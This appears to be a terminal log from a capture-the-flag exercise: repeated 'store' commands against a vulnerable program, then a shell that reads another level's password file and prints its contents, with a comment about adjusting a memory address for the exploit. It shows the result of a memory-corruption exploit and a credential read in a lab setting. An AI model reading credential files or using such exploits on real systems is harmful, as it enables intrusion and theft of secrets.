	Input command:  Number:  Index:  Completed store command successfully
	Input command:  Number:  Index:  Completed store command successfully
	Input command:  Number:  Index:  Completed store command successfully
	Input command:  Number:  Index:  Completed store command successfully
	Input command:  Number:  Index:  Completed store command successfully
	Input command:  Number:  Index:  Completed store command successfully
	Input command:  Number:  Index:  Completed store command successfully
	Input command:  Number:  Index:  Completed store command successfully
	Input command:  Number:  Index:  Completed store command successfully
	quit
	$ cat /home/users/level08/.pass
	7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC

<!-- Replace 4294956404 with 4294956340 if doing all levels back-to-back -->
